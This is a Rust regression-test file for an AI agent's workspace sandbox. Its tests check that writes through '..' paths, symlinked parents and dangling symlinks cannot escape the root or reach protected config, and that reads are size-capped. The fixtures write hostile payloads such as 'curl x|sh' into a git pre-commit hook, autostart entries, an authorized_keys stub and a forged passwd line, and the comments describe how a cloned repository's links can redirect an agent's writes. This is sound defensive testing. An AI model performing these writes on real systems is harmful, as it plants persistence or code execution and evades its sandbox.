//! The P2 root pattern: a path reaching the filesystem without passing the gate
//! meant to cover it.
//!
//! Every check that decided containment by `canonicalize` decided nothing at all
//! for a path whose leaf does not exist — and the leaf of a write is exactly what
//! usually does not exist. These are the four findings that shared that shape
//! (H3, H4, M6) plus the missing ceiling on the one read every document parser
//! starts at (M15), each named for the finding it closes.
//!
//! M15 covers three entry points rather than one as of 0.80.0: the ceiling went
//! on `read_bytes`, and `read_file` and `read_typed` reached an uncapped
//! `fs::read` of their own — the same allocation through the door an agent uses
//! first.
//!
//! F2a is the one the same shape survived into: `canonicalize` fails with
//! `NotFound` for a *dangling* symbolic link as well as for an absent file, so the
//! containment walk stopped on the link and graded the link's own name while every
//! writer went on landing at the destination. Git stores a link as a blob and does
//! not require its target to exist, so that one arrives with a clone.
//!
//! The tests without a finding ID are the other half of the job: this is the
//! change most able to refuse something legitimate, so a `..` that stays inside
//! the root, a symbolic link that stays inside the root — absolute, relative and
//! dangling — and a new file in a new subdirectory each have a test saying they
//! still work.

use io_harness::policy::{Act, Effect, Policy};
use io_harness::tools::workspace::MAX_DOCUMENT_BYTES;
use io_harness::tools::Workspace;

/// A workspace with a `src/` and a `docs/`, and a second directory standing in
/// for everything outside the root — `$HOME`, `/etc`, a `PATH` entry.
fn fixture() -> (tempfile::TempDir, tempfile::TempDir) {
    let root = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(root.path().join("src")).unwrap();
    std::fs::create_dir_all(root.path().join("docs")).unwrap();
    std::fs::write(root.path().join("src/a.rs"), "pub fn alpha() {}\n").unwrap();
    let outside = tempfile::tempdir().unwrap();
    (root, outside)
}

// ---------------------------------------------------------------------------
// H3 — a root-escaping path graded as though it named a file in the workspace
// ---------------------------------------------------------------------------

/// A path that climbs out of the root has no verdict to give, so it is denied.
///
/// It used to be *allowed*: `resolve` refused it, `check_path` fell through to
/// grading the lexical form, and that form popped `..` off an empty stack, so
/// a chain of them graded as the tail alone — an ordinary path in the workspace
/// as far as any rule could tell. A caller that asks the gate and then hands the
/// original string to a command, as `git_worktree` does, wrote a whole checkout
/// wherever the string pointed.
#[test]
fn h3_a_path_that_climbs_out_of_the_root_is_denied_rather_than_graded_as_an_inner_one() {
    let (root, _outside) = fixture();
    let ws = Workspace::new(root.path());

    for path in [
        "../elsewhere",
        "../../../../tmp/elsewhere",
        "src/../../elsewhere",
        "./../elsewhere",
    ] {
        for act in [Act::Read, Act::Write] {
            let verdict = ws.check_path(act, path);
            assert_eq!(
                verdict.effect,
                Effect::Deny,
                "{act:?} {path} must be denied, got {verdict:?}"
            );
            // No layer wrote this rule and no layer can lift it.
            assert_eq!(verdict.layer, None, "{path}");
            assert!(verdict.rule.is_some(), "{path} must say why");
        }
    }
}

/// The deny holds against a policy that allows everything, because containment
/// is not one of the things a layer gets to decide.
#[test]
fn h3_an_allow_everything_policy_does_not_lift_the_escape_deny() {
    let (root, _outside) = fixture();
    let allow_all = Policy::default()
        .layer("base")
        .allow_read("*")
        .allow_write("*");
    let ws = Workspace::with_policy(root.path(), allow_all);

    assert_eq!(
        ws.check_path(Act::Write, "../../escaped").effect,
        Effect::Deny
    );
    assert!(ws.write_file("../../escaped", "x").is_err());
}

// ---------------------------------------------------------------------------
// H4 — a symlinked parent and a leaf that does not exist yet
// ---------------------------------------------------------------------------

/// A repository ships `docs/ext -> $HOME`; the agent writes `docs/ext/.bashrc`.
///
/// Lexically the path is inside the root, `canonicalize` fails because the leaf
/// is not there, and the escape test sat inside that `Ok`. So the check was
/// skipped and `fs::write` followed the link. `.bashrc`, `authorized_keys`,
/// `.config/autostart/*` and `.git/hooks/*` are all absent until something
/// creates them, which is why creation was the dangerous half.
#[cfg(unix)]
#[test]
fn h4_a_write_cannot_create_a_file_through_a_symlinked_parent_that_leaves_the_root() {
    let (root, outside) = fixture();
    std::os::unix::fs::symlink(outside.path(), root.path().join("docs/ext")).unwrap();
    let ws = Workspace::new(root.path());

    assert_eq!(
        ws.check_path(Act::Write, "docs/ext/.bashrc").effect,
        Effect::Deny,
        "a leaf that does not exist yet is still checked"
    );
    assert!(ws.write_file("docs/ext/.bashrc", "planted\n").is_err());
    assert!(ws.write_bytes("docs/ext/.bashrc", b"planted\n").is_err());
    assert!(
        !outside.path().join(".bashrc").exists(),
        "nothing may be created outside the canonical root"
    );
}

/// The same link with a leaf that *does* exist. This one was already refused in
/// 0.73.0 — it is here so the fix for the creation half cannot quietly cost the
/// half that already worked.
#[cfg(unix)]
#[test]
fn h4_an_existing_file_through_a_symlinked_parent_stays_denied() {
    let (root, outside) = fixture();
    std::fs::write(outside.path().join(".bashrc"), "the original\n").unwrap();
    std::os::unix::fs::symlink(outside.path(), root.path().join("docs/ext")).unwrap();
    let ws = Workspace::new(root.path());

    assert_eq!(
        ws.check_path(Act::Write, "docs/ext/.bashrc").effect,
        Effect::Deny
    );
    assert!(ws.write_file("docs/ext/.bashrc", "stolen\n").is_err());
    assert_eq!(
        std::fs::read_to_string(outside.path().join(".bashrc")).unwrap(),
        "the original\n"
    );
}

/// A directory that does not exist yet, under a link that leaves the root:
/// `create_dir_all` used to build the whole chain outside the workspace.
#[cfg(unix)]
#[test]
fn h4_a_write_cannot_create_a_directory_tree_outside_the_root() {
    let (root, outside) = fixture();
    std::os::unix::fs::symlink(outside.path(), root.path().join("docs/ext")).unwrap();
    let ws = Workspace::new(root.path());

    assert!(ws
        .write_file("docs/ext/.config/autostart/x.desktop", "Exec=sh\n")
        .is_err());
    assert!(!outside.path().join(".config").exists());
}

// ---------------------------------------------------------------------------
// M6 — the path that was checked is the path that is written
// ---------------------------------------------------------------------------

/// A symbolic link at the leaf pointing at a file outside the root that does not
/// exist yet.
///
/// Containment alone cannot see this one: the deepest *existing* ancestor is
/// `src/`, which is inside the root, so the path check says yes. It is the
/// `O_NOFOLLOW` open that refuses, which is the same mechanism that closes the
/// race where a live `shell_start` handle swaps a gated-allowed file for a link
/// between the check and the write. In 0.73.0 `fs::write` followed it and created
/// the file outside.
#[cfg(unix)]
#[test]
fn m6_a_symlink_at_the_leaf_cannot_redirect_a_write_out_of_the_root() {
    let (root, outside) = fixture();
    let target = outside.path().join("planted.txt");
    std::os::unix::fs::symlink(&target, root.path().join("src/b.rs")).unwrap();
    let ws = Workspace::new(root.path());

    assert!(ws.write_file("src/b.rs", "planted\n").is_err());
    assert!(ws.write_bytes("src/b.rs", b"planted\n").is_err());
    assert!(!target.exists(), "the write must not follow the link out");
}

/// The same for a link whose target exists: the write lands nowhere rather than
/// on the file outside.
#[cfg(unix)]
#[test]
fn m6_an_existing_file_behind_a_leaf_symlink_is_not_overwritten() {
    let (root, outside) = fixture();
    let target = outside.path().join("passwd");
    std::fs::write(&target, "root:x:0:0\n").unwrap();
    std::os::unix::fs::symlink(&target, root.path().join("src/b.rs")).unwrap();
    let ws = Workspace::new(root.path());

    assert!(ws.write_file("src/b.rs", "attacker:x:0:0\n").is_err());
    assert_eq!(std::fs::read_to_string(&target).unwrap(), "root:x:0:0\n");
}

// ---------------------------------------------------------------------------
// F2a — a dangling symbolic link is not a leaf that does not exist yet
// ---------------------------------------------------------------------------

/// The link ships in the repository and its target does not exist:
/// `src/a.rs -> ../io.local.toml`, then `write_file("src/a.rs", …)`.
///
/// `canonicalize` answers `NotFound` for a dangling link exactly as it does for a
/// file nothing has created, so the containment walk treated the link as a leaf
/// about to be written and the gate graded `src/a.rs`. The write then opened the
/// leaf with `O_NOFOLLOW`, read the link, checked *containment* on the
/// destination — which is inside the root — and wrote `io.local.toml`, which this
/// release's own `builtin-config` deny exists to refuse. A link whose target
/// exists was never affected: `canonicalize` resolves that one and the
/// destination is what gets graded.
///
/// No `exec` permission is involved. Git stores a symbolic link as a blob holding
/// its target string and never requires the target to be there.
#[cfg(unix)]
#[test]
fn f2a_a_dangling_symlink_is_graded_by_its_destination_not_by_its_own_name() {
    let (root, _outside) = fixture();
    std::fs::remove_file(root.path().join("src/a.rs")).unwrap();
    std::os::unix::fs::symlink("../io.local.toml", root.path().join("src/a.rs")).unwrap();
    let ws = Workspace::with_policy(root.path(), Policy::default());

    assert_eq!(
        ws.check_path(Act::Write, "src/a.rs").effect,
        Effect::Deny,
        "the link's destination carries the deny, and the link is the destination"
    );
    assert!(ws
        .write_file("src/a.rs", "[run]\nmax_steps = 9999\n")
        .is_err());
    assert!(ws.write_bytes("src/a.rs", b"[run]\n").is_err());
    assert!(
        !root.path().join("io.local.toml").exists(),
        "the config a later run reads back was not created"
    );
}

/// The same route against the other half of `builtin-config`. `.git/hooks/*` and
/// `.git/config` are the shorter path from a write to arbitrary execution, and a
/// link at a name the policy allows reached both.
#[cfg(unix)]
#[test]
fn f2a_a_dangling_symlink_into_the_git_directory_is_denied_too() {
    let (root, _outside) = fixture();
    std::fs::create_dir_all(root.path().join(".git/hooks")).unwrap();
    std::os::unix::fs::symlink("../.git/hooks/pre-commit", root.path().join("src/hook.rs"))
        .unwrap();
    let ws = Workspace::with_policy(root.path(), Policy::default());

    assert_eq!(
        ws.check_path(Act::Write, "src/hook.rs").effect,
        Effect::Deny
    );
    assert!(ws
        .write_file("src/hook.rs", "#!/bin/sh\ncurl x|sh\n")
        .is_err());
    assert!(!root.path().join(".git/hooks/pre-commit").exists());
}

/// A dangling link that leaves the root is a containment answer rather than a
/// policy one, so an allow-everything policy does not lift it. The gate used to
/// say [`Effect::Allow`] here and leave the refusal entirely to the opener.
#[cfg(unix)]
#[test]
fn f2a_a_dangling_symlink_out_of_the_root_is_denied_whatever_the_policy_says() {
    let (root, outside) = fixture();
    let target = outside.path().join("authorized_keys");
    std::os::unix::fs::symlink(&target, root.path().join("docs/ext")).unwrap();
    let allow_all = Policy::permissive()
        .layer("app")
        .allow_read("*")
        .allow_write("*");
    let ws = Workspace::with_policy(root.path(), allow_all);

    assert_eq!(ws.check_path(Act::Write, "docs/ext").effect, Effect::Deny);
    assert!(ws.write_file("docs/ext", "ssh-rsa AAAA\n").is_err());
    assert!(!target.exists());
}

// ---------------------------------------------------------------------------
// M15 — a ceiling on the read every document parser starts at
// ---------------------------------------------------------------------------

/// `read_bytes` used to be a bare `fs::read`: the whole file into memory, no
/// ceiling, and every parser — pdf, docx, xlsx, pptx, barcode — begins there.
#[test]
fn m15_a_document_read_over_the_size_cap_is_refused() {
    let (root, _outside) = fixture();
    // Sparse: this costs a length, not the bytes.
    std::fs::File::create(root.path().join("huge.pdf"))
        .unwrap()
        .set_len(MAX_DOCUMENT_BYTES + 1)
        .unwrap();
    let ws = Workspace::new(root.path());

    let err = ws.read_bytes("huge.pdf").unwrap_err();
    let said = err.to_string();
    assert!(
        said.contains("huge.pdf"),
        "the refusal names the path: {said}"
    );
    assert!(
        said.contains(&MAX_DOCUMENT_BYTES.to_string()),
        "the refusal names the limit: {said}"
    );
}

/// A file under the cap is unaffected, and a missing one still says so.
#[test]
fn m15_a_document_read_under_the_cap_is_unchanged() {
    let (root, _outside) = fixture();
    std::fs::write(root.path().join("small.bin"), [0u8, 1, 2, 3]).unwrap();
    let ws = Workspace::new(root.path());

    assert_eq!(ws.read_bytes("small.bin").unwrap(), vec![0u8, 1, 2, 3]);
    assert!(ws.read_bytes("absent.bin").is_err());
}

/// The ceiling was on `read_bytes` alone, and `read_bytes` is not the door an
/// agent reaches for first. `read_file` and `read_typed` share one `fs::read` of
/// their own, uncapped, so the file the byte read refused was pulled into memory
/// whole by an ordinary text read of the same path — the same allocation, one
/// tool call away. All three entry points refuse alike, in the same words.
#[test]
fn m15_a_text_read_over_the_size_cap_is_refused_in_the_same_words() {
    let (root, _outside) = fixture();
    // Sparse: this costs a length, not the bytes — and the refusal is decided on
    // that length, so nothing here allocates 64 MiB either.
    std::fs::File::create(root.path().join("huge.txt"))
        .unwrap()
        .set_len(MAX_DOCUMENT_BYTES + 1)
        .unwrap();
    let ws = Workspace::new(root.path());

    for said in [
        ws.read_file("huge.txt").unwrap_err().to_string(),
        ws.read_typed("huge.txt").unwrap_err().to_string(),
        ws.read_bytes("huge.txt").unwrap_err().to_string(),
    ] {
        assert!(
            said.contains("huge.txt"),
            "the refusal names the path: {said}"
        );
        assert!(
            said.contains(&MAX_DOCUMENT_BYTES.to_string()),
            "the refusal names the limit: {said}"
        );
    }
}

/// What the ceiling must not take away. A text file under the cap still reads,
/// a file that is not there still reads empty — 0.1.0's deliberate behaviour,
/// and the one the size check runs in front of — and an extension the crate
/// classifies without decoding is still answered without reading a byte, which
/// is why a large image is not refused here.
#[test]
fn a_text_read_under_the_cap_and_a_classified_extension_are_unaffected() {
    let (root, _outside) = fixture();
    std::fs::File::create(root.path().join("huge.png"))
        .unwrap()
        .set_len(MAX_DOCUMENT_BYTES + 1)
        .unwrap();
    let ws = Workspace::new(root.path());

    assert_eq!(ws.read_file("src/a.rs").unwrap(), "pub fn alpha() {}\n");
    assert_eq!(
        ws.read_file("src/absent.rs").unwrap(),
        "",
        "a file that is not there is still one to create"
    );
    assert!(
        ws.read_typed("huge.png").is_ok(),
        "naming a format costs no bytes, so the size limit is not in front of it"
    );
}

// ---------------------------------------------------------------------------
// The three things that must keep working
// ---------------------------------------------------------------------------

/// A `..` that stays inside the root is an ordinary path, and stayed one.
#[test]
fn a_parent_component_that_stays_inside_the_root_still_reads_and_writes() {
    let (root, _outside) = fixture();
    let ws = Workspace::new(root.path());

    assert_eq!(
        ws.check_path(Act::Write, "src/../docs/n.md").effect,
        Effect::Allow
    );
    assert!(ws.write_file("src/../docs/n.md", "note\n").is_ok());
    assert_eq!(ws.read_file("docs/n.md").unwrap(), "note\n");
    assert_eq!(
        ws.read_file("./src/../src/a.rs").unwrap(),
        "pub fn alpha() {}\n"
    );
}

/// A symbolic link that stays inside the root still resolves and is still
/// written through — the `O_NOFOLLOW` open retries against where it points, and
/// where it points is contained.
#[cfg(unix)]
#[test]
fn a_symlink_that_stays_inside_the_root_is_still_written_through() {
    let (root, _outside) = fixture();
    std::os::unix::fs::symlink(
        root.path().join("src/a.rs"),
        root.path().join("src/link.rs"),
    )
    .unwrap();
    let ws = Workspace::new(root.path());

    assert_eq!(
        ws.check_path(Act::Write, "src/link.rs").effect,
        Effect::Allow
    );
    assert!(ws.write_file("src/link.rs", "pub fn beta() {}\n").is_ok());
    assert_eq!(
        std::fs::read_to_string(root.path().join("src/a.rs")).unwrap(),
        "pub fn beta() {}\n",
        "the link's target is what receives the bytes, as it always did"
    );
}

/// The companion to F2a, and the one it would have been easiest to break. A link
/// inside the root still writes through however it is written: an absolute target,
/// a relative one, and one whose file does not exist yet — which is the shape the
/// fix has to keep telling apart from an escape, since "the destination is not
/// there" is exactly what used to make a link invisible.
#[cfg(unix)]
#[test]
fn a_symlink_pointing_inside_the_root_still_writes_through_however_it_is_written() {
    let (root, _outside) = fixture();
    std::os::unix::fs::symlink(root.path().join("src/a.rs"), root.path().join("abs.rs")).unwrap();
    std::os::unix::fs::symlink("../src/a.rs", root.path().join("docs/rel.rs")).unwrap();
    std::os::unix::fs::symlink("../src/fresh.rs", root.path().join("docs/new.rs")).unwrap();
    let ws = Workspace::new(root.path());

    for (via, text) in [
        ("abs.rs", "pub fn one() {}\n"),
        ("docs/rel.rs", "pub fn two() {}\n"),
        ("docs/new.rs", "pub fn three() {}\n"),
    ] {
        assert_eq!(
            ws.check_path(Act::Write, via).effect,
            Effect::Allow,
            "{via} names a file inside the root"
        );
        ws.write_file(via, text)
            .unwrap_or_else(|e| panic!("{via} must still be written through: {e}"));
    }
    assert_eq!(
        std::fs::read_to_string(root.path().join("src/a.rs")).unwrap(),
        "pub fn two() {}\n",
        "both links land on the file they name"
    );
    assert_eq!(
        std::fs::read_to_string(root.path().join("src/fresh.rs")).unwrap(),
        "pub fn three() {}\n",
        "a dangling link inside the root creates the file it names"
    );
}

/// Creating a file in a directory that does not exist yet is the ordinary case
/// the new check has to keep allowing, since it is the case `canonicalize` could
/// never decide.
#[test]
fn a_new_file_in_a_new_subdirectory_is_still_created() {
    let (root, _outside) = fixture();
    let ws = Workspace::new(root.path());

    assert_eq!(
        ws.check_path(Act::Write, "src/deep/deeper/new.rs").effect,
        Effect::Allow
    );
    assert!(ws
        .write_file("src/deep/deeper/new.rs", "fn n() {}\n")
        .is_ok());
    assert_eq!(
        ws.read_file("src/deep/deeper/new.rs").unwrap(),
        "fn n() {}\n"
    );
}

/// A workspace whose root does not exist yet still behaves as it did: the same
/// resolution runs on the root, so nothing about "the directory is about to be
/// created" turns into a refusal.
#[test]
fn a_root_that_does_not_exist_yet_still_accepts_an_inner_write() {
    let (parent, _outside) = fixture();
    let root = parent.path().join("not-created-yet");
    let ws = Workspace::new(&root);

    assert_eq!(ws.check_path(Act::Write, "src/a.rs").effect, Effect::Allow);
    assert!(ws.write_file("src/a.rs", "fn n() {}\n").is_ok());
    assert_eq!(ws.check_path(Act::Write, "../escaped").effect, Effect::Deny);
}
